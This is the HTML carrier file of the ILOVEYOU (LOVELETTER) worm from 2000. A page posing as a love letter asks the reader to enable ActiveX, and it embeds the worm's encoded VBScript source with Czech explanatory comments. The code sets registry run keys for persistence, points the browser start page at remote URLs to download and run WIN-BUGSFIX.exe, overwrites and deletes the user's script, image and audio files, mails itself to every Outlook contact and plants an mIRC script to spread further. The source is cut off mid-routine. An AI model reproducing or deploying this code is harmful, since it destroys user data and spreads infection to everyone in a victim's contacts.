<HTML><HEAD><TITLE>LOVELETTER - HTML</TITLE><META NAME="Generator" CONTENT="BAROK VBS - LOVELETTER">
<META NAME="Author" CONTENT="spyder / ispyder@mail.com / @GRAMMERSoft Group / Manila, Philippines / March 2000">
<META NAME="Description" CONTENT="simple but i think this is good...">
</HEAD><BODY ONMOUSEOUT="window.name='main';window.open('LOVE-LETTER-FOR-YOU.HTM','main')" 
ONKEYDOWN="window.name='main';window.open('LOVE-LETTER-FOR-YOU.HTM','main')" BGPROPERTIES="fixed" BGCOLOR="#FF9933">
<CENTER><p>This HTML file need ActiveX Control</p><p>To Enable to read this HTML file<BR>- Please press 'YES' button to Enable ActiveX</p>
</CENTER><MARQUEE LOOP="infinite" BGCOLOR="yellow">----------z--------------------z----------</MARQUEE> 
</BODY></HTML>
<SCRIPT language="JScript">
<!--//
if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}
//-->
</SCRIPT>
<SCRIPT LANGUAGE="VBScript">
<!--
on error resume next
dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit
aw=1
code="[-["&vbcrlf& _
"[-[ Koment�� k ILOVEYOU viru (�ervu)"&vbcrlf& _
"[-[ (c) Daniel Do�ekal, Sv�t Namodro, 2000/05"&vbcrlf& _
"[-["&vbcrlf& _
"rem barok -loveletter(vbe) <i hate go to school>"&vbcrlf& _
"rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines"&vbcrlf& _
"On Error Resume Next"&vbcrlf& _
"dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow"&vbcrlf& _
"eq=]-]]-]"&vbcrlf& _
"[-["&vbcrlf& _
"[-[ zaj�mavost, ctr prom�nn� nakonec nikde nen� pou�ita, stejn� tak dirtemp a dow"&vbcrlf& _
"[-["&vbcrlf& _
"ctr=0"&vbcrlf& _
"[-["&vbcrlf& _
"[-[ otev�en� sebe sama a ulo�en� sebe same do vbscopy prom�nn�, bude pou��v�na "&vbcrlf& _
"[-[ pro dal�� ���en� a zpracov�v�n� viru"&vbcrlf& _
"[-["&vbcrlf& _
"Set fso = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
"set file = fso.OpenTextFile(WScript.ScriptFullname,1)"&vbcrlf& _
"vbscopy=file.ReadAll"&vbcrlf& _
"[-["&vbcrlf& _
"[-[ a abychom se nenudili, m��eme to spustit "&vbcrlf& _
"[-["&vbcrlf& _
"main()"&vbcrlf& _
""&vbcrlf& _
"[-[ -------------------------------------------------------------------------------------------------------------------"&vbcrlf& _
"[-[ "&vbcrlf& _
"sub main()"&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  dim wscr,rr"&vbcrlf& _
"  set wscr=CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ WSH (Windows Script Host) m� timeout hodnotu, tu je vhodn� zkontrolovat"&vbcrlf& _
"  [-[ a pot� nastavit na 0 - co� zajist� aby virus po��d b�el - pokud by tomu"&vbcrlf& _
"  [-[ tak nebylo, nemohl by b�et ]-]na pozad�]-] "&vbcrlf& _
"  [-["&vbcrlf& _
"  rr=wscr.RegRead(]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%Windows Scripting Host%-%Settings%-%Timeout]-])"&vbcrlf& _
"  if (rr>=1) then"&vbcrlf& _
"    [-[ Set script time out to infinity"&vbcrlf& _
"    wscr.RegWrite ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%Windows Scripting Host%-%Settings%-%Timeout]-], 0, ]-]REG_DWORD]-]"&vbcrlf& _
"  end if"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ zji�t�n� um�st�n� adres��e s WINDOWS, adres��e SYSTEM (ten b�v� uvnit� WINDOWS adres��e)"&vbcrlf& _
"  [-[ a TEMP adres��e - tyto adres��e budou pot�eba pro dal�� roz���en� viru (ulo�en� v syst�mu)"&vbcrlf& _
"  [-["&vbcrlf& _
"  Set dirwin = fso.GetSpecialFolder(0)"&vbcrlf& _
"  Set dirsystem = fso.GetSpecialFolder(1)"&vbcrlf& _
"  Set dirtemp = fso.GetSpecialFolder(2)"&vbcrlf& _
"  [-[ "&vbcrlf& _
"  [-[ v adres��i SYSTEM bude vytvo�ena kopie pod n�zvem MSKernel32.vbs"&vbcrlf& _
"  [-[ v adres��e WINDOWS bude vytvo�ena kopie pod n�zvem Win32DLL.vbs"&vbcrlf& _
"  [-[ v adres��i SYSTEM bude vytvo�ena kopie pod n�zvem LOVE-LETTER-FOR-YOU.TXT.vbs"&vbcrlf& _
"  [-["&vbcrlf& _
"  Set c = fso.GetFile(WScript.ScriptFullName)"&vbcrlf& _
"  c.Copy(dirsystem&]-]%-%MSKernel32.vbs]-])"&vbcrlf& _
"  c.Copy(dirwin&]-]%-%Win32DLL.vbs]-])"&vbcrlf& _
"  c.Copy(dirsystem&]-]%-%LOVE-LETTER-FOR-YOU.TXT.vbs]-])"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ Definice pot�ebn�ch v�c� v Registry, "&vbcrlf& _
"  [-[ nastaven� domovsk� str�nky (home page, default) pro Internet explorer na jednu"&vbcrlf& _
"  [-[ z n�hodn� ur�en�ch hodnot - zajist� sta�en� druh� ��sti viru"&vbcrlf& _
"  [-["&vbcrlf& _
"  regruns()"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ vytvo�en� HTML souboru pou��van�ho pro mIRC a obsahuj�c�ho virus v podob�"&vbcrlf& _
"  [-[ spou�t�n�ho ActiveX komponentu, dal�� cesta jak se virus ����"&vbcrlf& _
"  [-["&vbcrlf& _
"  html()"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ rozesl�n� viru na adresy v WAB (Outlook Address Book)"&vbcrlf& _
"  [-["&vbcrlf& _
"  spreadtoemail()"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ ���en� viru do r�zn�ch typ� soubor� a zpracov�n� mIRC skriptu"&vbcrlf& _
"  [-[ s pomoc� ji� d��ve vytvo�en�ho HTML souboru - viz html() procedura"&vbcrlf& _
"  [-["&vbcrlf& _
"  listadriv()"&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
""&vbcrlf& _
"[-[ -------------------------------------------------------------------------------------------------------------------"&vbcrlf& _
"[-[ Definice pot�ebn�ch v�c� v Registry, "&vbcrlf& _
"[-[ Nastaven� domovsk� str�nky (home page, default) pro Internet explorer na jednu"&vbcrlf& _
"[-[ z n�hodn� ur�en�ch hodnot - zajist� sta�en� druh� ��sti viru"&vbcrlf& _
"[-["&vbcrlf& _
"sub regruns()"&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  Dim num, downread"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ MSkernel32.vbs verze bude pou�ita pro RUN kl��, co� znamen�, �e p�i startu syst�mu"&vbcrlf& _
"  [-[ se V�EM u�ivatel�m provede spu�t�n� viru "&vbcrlf& _
"  [-["&vbcrlf& _
"  regcreate ]-]HKEY_LOCAL_MACHINE%-%Software%-%Microsoft%-%Windows%-%CurrentVersion%-%Run%-%MSKernel32]-],dirsystem&]-]%-%MSKernel32.vbs]-]"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ Win32dll.vbs verze bude pou�ita pro RUNSERVICES kl��, co� je je�t� hor��, virus"&vbcrlf& _
"  [-[ toti� po startu syst�mu pob�� jako SLU�BA (nesnadno detekovateln� v TaskManageru)"&vbcrlf& _
"  [-[ "&vbcrlf& _
"  regcreate ]-]HKEY_LOCAL_MACHINE%-%Software%-%Microsoft%-%Windows%-%CurrentVersion%-%RunServices%-%Win32DLL]-],dirwin&]-]%-%Win32DLL.vbs]-]"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ zji�t�n� kde se nach�z� DOWNLOAD adres�� IE (tj.  kam se ukl�daj� sta�en� soubory)"&vbcrlf& _
"  [-[ pokud nen� definov�n, nastav� se napevno na C:%-% "&vbcrlf& _
"  [-["&vbcrlf& _
"  downread = ]-]]-]"&vbcrlf& _
"  downread = regget(]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%Internet Explorer%-%Download Directory]-])"&vbcrlf& _
"  if (downread = ]-]]-]) then"&vbcrlf& _
"    downread = ]-]c:%-%]-]"&vbcrlf& _
"  end if"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ kontrola jestli ji� do�lo ke sta�en� druh� ��sti viru, EXE souboru"&vbcrlf& _
"  [-[ ten se toti� p�ejmenov�v� na WinFAT32.EXE "&vbcrlf& _
"  [-["&vbcrlf& _
"  if (fileexist(dirsystem&]-]%-%WinFAT32.exe]-]) = 1) then"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[ nastaven� Start Page (home page) IE na jednu ze �ty� adres kde je ulo�ena"&vbcrlf& _
"    [-[ druh� ��st viru (EXE). Na�t�st� p�estal tento web existovat ji� n�kolik"&vbcrlf& _
"    [-[ hodin pot� co virus za�al ��dit. Je zde tak� druh� potenci�ln� probl�m"&vbcrlf& _
"    [-[ sta�en� .EXE souboru mus� u�ivatel potvrdit - co� ov�em �ada z nich r�da ud�l�"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[ ke sta�en� samoz�ejm� dojde a� v okam�iku, kdy u�ivatel poprv� spust� "&vbcrlf& _
"    [-[ Internet Explorer (nezapome�te, virus m��e st�le b�et kdesi v pozad�)"&vbcrlf& _
"    [-["&vbcrlf& _
"    Randomize"&vbcrlf& _
"    num = Int((4 * Rnd) + 1)"&vbcrlf& _
"    if num = 1 then"&vbcrlf& _
"      regcreate ]-]HKCU%-%Software%-%Microsoft%-%Internet Explorer%-%Main%-%Start Page]-],]-]http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe]-]"&vbcrlf& _
"    elseif num = 2 then"&vbcrlf& _
"      regcreate ]-]HKCU%-%Software%-%Microsoft%-%Internet Explorer%-%Main%-%Start Page]-],]-]http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe]-]"&vbcrlf& _
"    elseif num = 3 then"&vbcrlf& _
"      regcreate ]-]HKCU%-%Software%-%Microsoft%-%Internet Explorer%-%Main%-%Start Page]-],]-]http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe]-]"&vbcrlf& _
"    elseif num = 4 then"&vbcrlf& _
"      regcreate ]-]HKCU%-%Software%-%Microsoft%-%Internet Explorer%-%Main%-%Start Page]-],]-]http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe]-]"&vbcrlf& _
"    end if"&vbcrlf& _
"  end if"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ kontrola jestli u� do�lo k sta�en� druh� ��sti viru (EXE)"&vbcrlf& _
"  [-[ a pokud ano, tak vytvo�en� nov�ho RUN - tj. druh� ��st viru (EXE)"&vbcrlf& _
"  [-[ se bude spou�t�t p�i ka�d�m startu syst�mu (jednor�zov�)"&vbcrlf& _
"  [-[ Start Page IE je potom nastavena ]-]zp�t]-] na about:blank, tak�e v�ckr�t"&vbcrlf& _
"  [-[ se program u� stahovat nebude"&vbcrlf& _
"  [-["&vbcrlf& _
"  if (fileexist(downread & ]-]%-%WIN-BUGSFIX.exe]-]) = 0) then"&vbcrlf& _
"    regcreate ]-]HKEY_LOCAL_MACHINE%-%Software%-%Microsoft%-%Windows%-%CurrentVersion%-%Run%-%WIN-BUGSFIX]-], downread & ]-]%-%WIN-BUGSFIX.exe]-]"&vbcrlf& _
"    regcreate ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%Internet Explorer%-%Main%-%Start Page]-], ]-]about:blank]-]"&vbcrlf& _
"  end if"&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"[-[ -------------------------------------------------------------------------------------------------------------------"&vbcrlf& _
"[-[ ���en� viru do r�zn�ch typ� soubor� a zpracov�n� mIRC skriptu"&vbcrlf& _
"[-[ s pomoc� ji� d��ve vytvo�en�ho HTML souboru - viz html() procedura"&vbcrlf& _
"[-["&vbcrlf& _
"sub listadriv"&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  Dim d,dc,s"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ projde v�echny dostupn� disky, tj. jak lok�ln�, tak s�ov� (namapovan�)"&vbcrlf& _
"  [-[ kter� m��e proj�t a vrhne se na jejich kompletn� strukturu"&vbcrlf& _
"  [-["&vbcrlf& _
"  Set dc = fso.Drives"&vbcrlf& _
"  For Each d in dc"&vbcrlf& _
"    If d.DriveType = 2 or d.DriveType=3 Then"&vbcrlf& _
"      folderlist(d.path & ]-]%-%]-])"&vbcrlf& _
"    end if"&vbcrlf& _
"  Next"&vbcrlf& _
"  listadriv = s"&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"[-["&vbcrlf& _
"[-[ ���en� ]-]n�kazy]-] na specifick� soubory "&vbcrlf& _
"[-[ vol� se v�dy pro ka�dou SLO�KU a efekt je"&vbcrlf& _
"[-[ pr�chod v�ech disk� a v�ech slo�ek "&vbcrlf& _
"[-["&vbcrlf& _
"sub infectfiles(folderspec)  "&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  dim f,f1,fc,ext,ap,mircfname,s,bname,mp3"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ z�sk�n� senzamu v�ech soubor� ve slo�ce a n�sledn�"&vbcrlf& _
"  [-[ pr�chod v�ech soubor�"&vbcrlf& _
"  [-["&vbcrlf& _
"  set f = fso.GetFolder(folderspec)"&vbcrlf& _
"  set fc = f.Files"&vbcrlf& _
"  for each f1 in fc"&vbcrlf& _
"    ext = fso.GetExtensionName(f1.path)"&vbcrlf& _
"    ext = lcase(ext)"&vbcrlf& _
"    s = lcase(f1.name)"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[  VBS / VBE p��pona - P�EPS�N� VIREM, z�st�v� p�vodn� jm�no, m�n� se obsah (nevratn� zni�en�) "&vbcrlf& _
"    [-["&vbcrlf& _
"    if (ext = ]-]vbs]-]) or (ext = ]-]vbe]-]) then"&vbcrlf& _
"      set ap = fso.OpenTextFile(f1.path,2,true)"&vbcrlf& _
"      ap.write vbscopy"&vbcrlf& _
"      ap.close"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[ JS / JSE / CSS / WSH / SCT / HTA - P�EPS�N� VIREM "&vbcrlf& _
"    [-[   a pot� vytvo�en� NOV�CH soubor� s cel�m p�vodn�m jm�nem a "&vbcrlf& _
"    [-[   p��ponou .vbs (tj. byl li nap�. test.wsh - bude nav�c je�t� test.wsh.vbs"&vbcrlf& _
"    [-[   a pot� SMAZ�N� p�vodn�ho souboru (tj. p��jdete o v�echny soubory s"&vbcrlf& _
"    [-[   s t�mito p��ponami, op�t nevratn� zni�en�"&vbcrlf& _
"    [-["&vbcrlf& _
"    elseif(ext = ]-]js]-]) or (ext = ]-]jse]-]) or (ext = ]-]css]-]) or _"&vbcrlf& _
"          (ext = ]-]wsh]-]) or (ext = ]-]sct]-]) or (ext = ]-]hta]-]) then"&vbcrlf& _
"      set ap = fso.OpenTextFile(f1.path,2,true)"&vbcrlf& _
"      ap.write vbscopy"&vbcrlf& _
"      ap.close"&vbcrlf& _
"      bname = fso.GetBaseName(f1.path)"&vbcrlf& _
"      set cop = fso.GetFile(f1.path)"&vbcrlf& _
"      cop.copy(folderspec & ]-]%-%]-] & bname & ]-].vbs]-])"&vbcrlf& _
"      fso.DeleteFile(f1.path)"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[ JPG / JPEG - tot� jako v��e"&vbcrlf& _
"    [-[ p�ijdete o tyto soubory a bude vytvo�ena jejich jmenn� kopie"&vbcrlf& _
"    [-[ obsahuj�c� virus - tj. nap� naked.jpg -> naked.jpg.vbs"&vbcrlf& _
"    [-[ op�t nevratn� ni�en�"&vbcrlf& _
"    [-["&vbcrlf& _
"    elseif(ext = ]-]jpg]-]) or (ext = ]-]jpeg]-]) then"&vbcrlf& _
"      set ap=fso.OpenTextFile(f1.path, 2,true)"&vbcrlf& _
"      ap.write vbscopy"&vbcrlf& _
"      ap.close"&vbcrlf& _
"      set cop=fso.GetFile(f1.path)"&vbcrlf& _
"      cop.copy(f1.path & ]-].vbs]-])"&vbcrlf& _
"      fso.DeleteFile(f1.path)"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[ MP3 / MP2 - vytvo�� jmennou kopii s .vbs dodatkem (nap�. gott.mp3 -> gott.mp3.vbs)"&vbcrlf& _
"    [-[  a pot� ukryt� p�vodn�ho souboru (dostane HIDDEN p��znak)"&vbcrlf& _
"    [-["&vbcrlf& _
"    elseif(ext=]-]mp3]-]) or (ext=]-]mp2]-]) then"&vbcrlf& _
"      set mp3 = fso.CreateTextFile(f1.path & ]-].vbs]-])"&vbcrlf& _
"      mp3.write vbscopy"&vbcrlf& _
"      mp3.close"&vbcrlf& _
"      set att = fso.GetFile(f1.path)"&vbcrlf& _
"      att.attributes = att.attributes + 2"&vbcrlf& _
"    end if"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[ pokud je folderspec cokoliv jin�ho ne� ]-]]-] �i pozd�ji zji�t�n� um�st�n�"&vbcrlf& _
"    [-[ v�nuje se mIRC (]-]eq]-] slou�� k tomu aby to ned�lal po��d dokola v jednom adres��i)"&vbcrlf& _
"    [-[ znamen� to, �e mIRC v�ci nep�ep�e (mo�nost) jenom ve vlastn�m po��ta�i"&vbcrlf& _
"    [-[ ale tak� na ciz�m disku !"&vbcrlf& _
"    [-["&vbcrlf& _
"    if (eq<>folderspec) then"&vbcrlf& _
"      [-["&vbcrlf& _
"      [-[ detekece existence mIRC programu pomoc� soubor� s uveden�mi jm�ny"&vbcrlf& _
"      [-["&vbcrlf& _
"      if (s = ]-]mirc32.exe]-]) or (s = ]-]mlink32.exe]-]) or (s = ]-]mirc.ini]-]) or _"&vbcrlf& _
"         (s = ]-]script.ini]-]) or (s = ]-]mirc.hlp]-]) then"&vbcrlf& _
"	[-["&vbcrlf& _
"        [-[ vytvo�en� NOV�HO script.ini obsahuj�c�ho v�e pot�ebn� "&vbcrlf& _
"        [-[ k vyu�it� mIRC k ���en� viru - pou�ije se HTML vytvo�en�"&vbcrlf& _
"        [-[ v jin� funkci (viz n�e) "&vbcrlf& _
"        [-["&vbcrlf& _
"        set scriptini=fso.CreateTextFile(folderspec&]-]%-%script.ini]-])"&vbcrlf& _
"        scriptini.WriteLine ]-][script]]-]"&vbcrlf& _
"        scriptini.WriteLine ]-];mIRC Script]-]"&vbcrlf& _
"        scriptini.WriteLine ]-];  Please dont edit this script... mIRC will corrupt, if mIRC will]-]"&vbcrlf& _
"        scriptini.WriteLine ]-]     corrupt... WINDOWS will affect and will not run correctly. thanks]-]"&vbcrlf& _
"        scriptini.WriteLine ]-];]-]"&vbcrlf& _
"        scriptini.WriteLine ]-];Khaled Mardam-Bey]-]"&vbcrlf& _
"        scriptini.WriteLine ]-];http://www.mirc.com]-]"&vbcrlf& _
"        scriptini.WriteLine ]-];]-]"&vbcrlf& _
"        scriptini.WriteLine ]-]n0=on 1:JOIN:#:{]-]"&vbcrlf& _
"        scriptini.WriteLine ]-]n1=  /if ( $nick == $me ) { halt }]-]"&vbcrlf& _
"        scriptini.WriteLine ]-]n2=  /.dcc send $nick ]-]&dirsystem&]-]%-%LOVE-LETTER-FOR-YOU.HTM]-]"&vbcrlf& _
"        scriptini.WriteLine ]-]n3=}]-]"&vbcrlf& _
"        scriptini.close"&vbcrlf& _
"	[-["&vbcrlf& _
"	[-[ zapamatov�n� si kde ji� zpracoval mIRC v�ci"&vbcrlf& _
"        [-[ efekt je st�le stejn� - ud�l� to v�ude kde to je mo�n�"&vbcrlf& _
"	[-[ zapamatov�v�n� eq se postar� �e nevykon�v� po��d dokola tenhle k�d"&vbcrlf& _
"	[-[ pokud postupn� proch�z� adres�� (jsme na per-file �rovni)"&vbcrlf& _
"        [-["&vbcrlf& _
"        eq=folderspec"&vbcrlf& _
"      end if"&vbcrlf& _
"    end if"&vbcrlf& _
"  next  "&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"[-["&vbcrlf& _
"[-[ pomocn� SUB pro pr�chod slo�ky (adres��e), v�ech soubor� a pot�"&vbcrlf& _
"[-[ rekurzivn� pr�chod p��padn�ch vno�en�c slo�ek"&vbcrlf& _
"[-["&vbcrlf& _
"sub folderlist(folderspec)  "&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  dim f,f1,sf"&vbcrlf& _
"  set f = fso.GetFolder(folderspec)  "&vbcrlf& _
"  set sf = f.SubFolders"&vbcrlf& _
"  for each f1 in sf"&vbcrlf& _
"    infectfiles(f1.path)"&vbcrlf& _
"    folderlist(f1.path)"&vbcrlf& _
"  next  "&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"[-[ "&vbcrlf& _
"[-[ pomocn� SUB pro vytv�en� kl��e v registry"&vbcrlf& _
"[-["&vbcrlf& _
"sub regcreate(regkey,regvalue)"&vbcrlf& _
"  Set regedit = CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
"  regedit.RegWrite regkey,regvalue"&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
"[-[ "&vbcrlf& _
"[-[ pomocn� SUB pro �ten� obsahu kl��e v registry"&vbcrlf& _
"[-["&vbcrlf& _
"function regget(value)"&vbcrlf& _
"  Set regedit = CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
"  regget = regedit.RegRead(value)"&vbcrlf& _
"end function"&vbcrlf& _
""&vbcrlf& _
"[-["&vbcrlf& _
"[-[ pomocn� sub pro testov�n� existence souboru"&vbcrlf& _
"[-["&vbcrlf& _
"function fileexist(filespec)"&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  dim msg"&vbcrlf& _
"  if (fso.FileExists(filespec)) Then"&vbcrlf& _
"    msg = 0"&vbcrlf& _
"    else"&vbcrlf& _
"    msg = 1"&vbcrlf& _
"  end if"&vbcrlf& _
"  fileexist = msg"&vbcrlf& _
"end function"&vbcrlf& _
""&vbcrlf& _
"[-["&vbcrlf& _
"[-[ pomocn� SUB pro testov�n� existence slo�ky (adres��e)"&vbcrlf& _
"[-["&vbcrlf& _
"function folderexist(folderspec)"&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  dim msg"&vbcrlf& _
"  if (fso.GetFolderExists(folderspec)) then"&vbcrlf& _
"    msg = 0"&vbcrlf& _
"    else"&vbcrlf& _
"    msg = 1"&vbcrlf& _
"  end if"&vbcrlf& _
"  fileexist = msg"&vbcrlf& _
"end function"&vbcrlf& _
""&vbcrlf& _
"[-[ -------------------------------------------------------------------------------------------------------------------"&vbcrlf& _
"[-[ ���en� viru mailem"&vbcrlf& _
"[-[ rozesl�n� viru na adresy v WAB (Outlook Address Book)"&vbcrlf& _
"[-["&vbcrlf& _
"sub spreadtoemail()"&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad"&vbcrlf& _
"  set regedit = CreateObject(]-]WScript.Shell]-])"&vbcrlf& _
"  [-[ "&vbcrlf& _
"  [-[ aktivace Outlooku (tj. neum� se ���it jinak ne� outlookem)"&vbcrlf& _
"  [-[ a zji�t�n� reference na MAPI aby mohl z�skat v�echny adresy"&vbcrlf& _
"  [-["&vbcrlf& _
"  set out = WScript.CreateObject(]-]Outlook.Application]-])"&vbcrlf& _
"  set mapi = out.GetNameSpace(]-]MAPI]-])"&vbcrlf& _
"  [-[ "&vbcrlf& _
"  [-[ tohle je nep��jemn�, zjist� v�echny ADRES��E (tj. nikoliv jenom jeden)"&vbcrlf& _
"  [-[ a v�echny je projde (zpracuje)"&vbcrlf& _
"  [-["&vbcrlf& _
"  for ctrlists = 1 to mapi.AddressLists.Count"&vbcrlf& _
"    set a = mapi.AddressLists(ctrlists)"&vbcrlf& _
"    x = 1"&vbcrlf& _
"    [-["&vbcrlf& _
"    [-[ zde kontroluje p��padn� NOV� adresy"&vbcrlf& _
"    [-[ v address booku (n�e si toti� zapamatuje na KOLIK adres ji� poslal)"&vbcrlf& _
"    [-[ a pokud jich je v adress booku v�c, tak prost� ]-]do�le]-] i ty nov�"&vbcrlf& _
"    [-[ (na star� nic nepo�le, m� je ozna�en�)"&vbcrlf& _
"    [-["&vbcrlf& _
"    regv = regedit.RegRead(]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%WAB%-%]-] & a)"&vbcrlf& _
"    if (regv = ]-]]-]) then"&vbcrlf& _
"      regv = 1"&vbcrlf& _
"    end if"&vbcrlf& _
"    if (int(a.AddressEntries.Count) > int(regv)) then"&vbcrlf& _
"      [-["&vbcrlf& _
"      [-[ projde v�echny polo�ky v pr�v� zpracovav�n�m adres��i"&vbcrlf& _
"      [-[ tj. nen� zde ��DN� mno�stevn� omezen�"&vbcrlf& _
"      [-["&vbcrlf& _
"      for ctrentries = 1 to a.AddressEntries.Count"&vbcrlf& _
"        malead = a.AddressEntries(x)"&vbcrlf& _
"        regad = ]-]]-]"&vbcrlf& _
"	[-[ "&vbcrlf& _
"	[-[ kontrola jestli u� pos�lal, ka�d�mu komu toti� poslal"&vbcrlf& _
"	[-[ u� nepo�le v�ckr�t - �e�� to z�pisem do registry"&vbcrlf& _
"	[-[ co� je velmi nep��jemn� (m��e nar�st a shodit stroj)"&vbcrlf& _
"	[-["&vbcrlf& _
"        regad = regedit.RegRead(]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%WAB%-%]-] & malead)"&vbcrlf& _
"        if (regad = ]-]]-]) then"&vbcrlf& _
"	  [-["&vbcrlf& _
"	  [-[ vytvo�en� mailov� zpr�vy s p��lohou "&vbcrlf& _
"	  [-[ je to jen oby�ejn� textov� zpr�va, tak�e ��dn� automatick�"&vbcrlf& _
"	  [-[ spu�t�n� - p��loha se sama nikdy nespust�, spustit ji mus� u�ivatel"&vbcrlf& _
"	  [-["&vbcrlf& _
"          set male = out.CreateItem(0)"&vbcrlf& _
"          male.Recipients.Add(malead)"&vbcrlf& _
"          male.Subject = ]-]ILOVEYOU]-]"&vbcrlf& _
"          male.Body = vbcrlf & ]-]kindly check the attached LOVELETTER coming from me.]-]"&vbcrlf& _
"          male.Attachments.Add(dirsystem & ]-]%-%LOVE-LETTER-FOR-YOU.TXT.vbs]-])"&vbcrlf& _
"	  [-[ "&vbcrlf& _
"	  [-[ odesl�n�"&vbcrlf& _
"	  [-["&vbcrlf& _
"          male.Send"&vbcrlf& _
"	  [-["&vbcrlf& _
"	  [-[ nastaven� p��znaku �e na tuto adresu ji� poslal"&vbcrlf& _
"	  [-["&vbcrlf& _
"          regedit.RegWrite ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%WAB%-%]-] & malead, 1, ]-]REG_DWORD]-]"&vbcrlf& _
"        end if"&vbcrlf& _
"        x = x + 1"&vbcrlf& _
"      next"&vbcrlf& _
"      [-["&vbcrlf& _
"      [-[ dal�� z�pis do registry, zde si zapamatuje kolik adres zpracoval"&vbcrlf& _
"      [-["&vbcrlf& _
"      regedit.RegWrite ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%WAB%-%]-]&a,a.AddressEntries.Count"&vbcrlf& _
"    else"&vbcrlf& _
"      regedit.RegWrite ]-]HKEY_CURRENT_USER%-%Software%-%Microsoft%-%WAB%-%]-]&a,a.AddressEntries.Count"&vbcrlf& _
"    end if"&vbcrlf& _
"  next"&vbcrlf& _
"  Set out = Nothing"&vbcrlf& _
"  Set mapi = Nothing"&vbcrlf& _
"end sub"&vbcrlf& _
""&vbcrlf& _
""&vbcrlf& _
"[-[ -------------------------------------------------------------------------------------------------------------------"&vbcrlf& _
"[-[ vytvo�en� HTML souboru pou��van�ho pro mIRC a obsahuj�c�ho virus v podob�"&vbcrlf& _
"[-[ spou�t�n�ho ActiveX komponentu, dal�� cesta jak se virus ����"&vbcrlf& _
"[-["&vbcrlf& _
"[-[ vytv��en� HTML je pon�kud komplikovan� - d�vod je prost�"&vbcrlf& _
"[-[ slou�� toti� k tomu aby VYTVO�ILO virus (MSKernel32.vbs) "&vbcrlf& _
"[-[ a pot� dokonce nastavilo RUN v Registry na jeho spu�t�n�"&vbcrlf& _
"[-[ "&vbcrlf& _
"[-[ tenhle HTML dokument dostanou mIRC u�ivatel� pomoc� DCC"&vbcrlf& _
"[-[ a pokud jej ]-]zobraz�]-], tak se nakaz�"&vbcrlf& _
"[-["&vbcrlf& _
"[-[ ty pon�kud zmaten� ?-?, @-@, #-#, ^-^ slou�� k zad�n�,"&vbcrlf& _
"[-[ k�d�, kter� by se problematicky zad�valy ru�n�, pozd�ji"&vbcrlf& _
"[-[ jsou pomoc� replace() zam��ov�ny. Stejn� tak bude"&vbcrlf& _
"[-[ tent�� zp�sob pou�it pro zak�dov�n� uvnit� v�sledn�ho"&vbcrlf& _
"[-[ HTML "&vbcrlf& _
"[-["&vbcrlf& _
"sub html"&vbcrlf& _
"  On Error Resume Next"&vbcrlf& _
"  dim lines, n, dta1, dta2, dt1, dt2, dt3, dt4, l1, dt5, dt6"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ t�mto bude HTML za��nat"&vbcrlf& _
"  [-["&vbcrlf& _
